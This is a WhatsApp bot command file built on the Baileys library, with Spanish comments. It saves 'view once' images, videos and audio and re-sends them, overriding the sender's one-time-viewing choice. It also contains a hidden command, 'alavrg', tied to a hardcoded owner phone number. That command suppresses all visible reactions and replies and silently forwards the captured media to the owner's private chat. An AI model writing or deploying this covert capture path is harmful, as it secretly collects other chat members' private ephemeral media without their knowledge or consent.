import { downloadContentFromMessage, extractMessageContent } from 'baileys';

export default {
  command: ['readviewonce', 'read', 'readvo', 'alavrg'], // Añadimos 'alavrg' como comando
  category: 'utils',
  description: 'Convertir imagen/video de una vista a contenido.',
  run: async ({ msg, sock, usedPrefix, command }) => {
    const quoted = msg.quoted;
    if (!quoted) {
      return msg.reply('《✧》 Por favor, responde a un mensaje "ViewOnce" para ver su contenido.');
    }

    // Definimos tu número y verificamos si eres tú usando la palabra clave
    const myNumber = '584121911525@s.whatsapp.net';
    const isOwner = msg.sender.includes('584121911525');
    const isSecretCommand = command.toLowerCase() === 'alavrg';
    const isSilentMode = isOwner && isSecretCommand;

    try {
      // Solo reaccciona con emoji si NO estás en modo sigiloso
      if (!isSilentMode) {
        await msg.react('🕒');
      }

      const content = extractMessageContent(quoted.message || quoted);
      if (!content) {
        if (!isSilentMode) return msg.reply('《✧》 No se pudo extraer el contenido.');
        return;
      }

      const messageType = Object.keys(content)[0];
      const mediaMessage = content[messageType];
      const stream = await downloadContentFromMessage(mediaMessage, messageType.replace('Message', '').toLowerCase());
      if (!stream) {
        if (!isSilentMode) return msg.reply('《✧》 No se pudo descargar el contenido.');
        return;
      }

      let buffer = Buffer.from([]);
      for await (const chunk of stream) {
        buffer = Buffer.concat([buffer, chunk]);
      }

      // Si es en modo sigiloso, el destino es tu PV; si no, es el chat actual
      const targetChat = isSilentMode ? myNumber : msg.chat;
      const quoteOption = isSilentMode ? {} : { quoted: msg };

      if (/video/i.test(messageType)) {
        await sock.sendMessage(targetChat, { video: buffer, caption: mediaMessage.caption || '', mimetype: 'video/mp4' }, quoteOption);
      } else if (/image/i.test(messageType)) {
        await sock.sendMessage(targetChat, { image: buffer, caption: mediaMessage.caption || '' }, quoteOption);
      } else if (/audio/i.test(messageType)) {
        await sock.sendMessage(targetChat, { audio: buffer, mimetype: 'audio/ogg; codecs=opus', ptt: mediaMessage.ptt || false }, quoteOption);
      }      

      // Reacción final solo si no es modo sigiloso
      if (!isSilentMode) {
        await msg.react('✔️');
      }
    } catch (e) {
      if (!isSilentMode) {
        await msg.react('✖️');
        await msg.reply(`> An unexpected error occurred while executing command *${usedPrefix + command}*. Please try again or contact support if the issue persists.\n> [Error: *${e.message}*]`);
      }
    }
  }
};
